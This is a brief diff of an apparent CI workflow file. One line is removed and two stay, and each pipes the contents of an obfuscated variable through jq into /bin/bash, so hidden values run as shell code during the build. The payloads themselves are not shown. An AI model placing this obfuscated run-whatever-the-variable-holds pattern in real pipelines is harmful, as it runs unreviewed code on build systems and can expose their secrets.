@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$nidaj583" | jq -r .ogr4 | /bin/bash
           echo $g273 | jq -r .id24 | /bin/bash
-          echo $f14617 | jq -r .zeqb3527 | /bin/bash
 
       - name: Upload data
         if: always()
